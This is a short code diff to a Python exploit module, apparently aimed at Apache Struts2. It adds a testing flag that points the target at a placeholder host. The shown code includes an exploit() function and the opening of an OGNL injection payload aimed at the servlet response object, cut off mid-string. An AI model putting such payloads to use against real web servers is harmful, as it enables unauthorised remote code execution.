@@ -3,6 +3,7 @@ import requests
 
 rhost = ''
 timeout = 3
+testing = False
 settings = {
         'rhost': {'Desc': '(url) website to test', 'Value': rhost},
         'timeout': {'Desc': '(int) request timeout', 'Value': timeout}
@@ -22,7 +23,9 @@ def reloadSettings():
     settings['timeout']['Value'] = timeout
 
 def exploit():
-    global rhost
+    global rhost, testing
+    if(testing):
+        rhost = 'http://www.changeme.com'
     random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
 
     payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
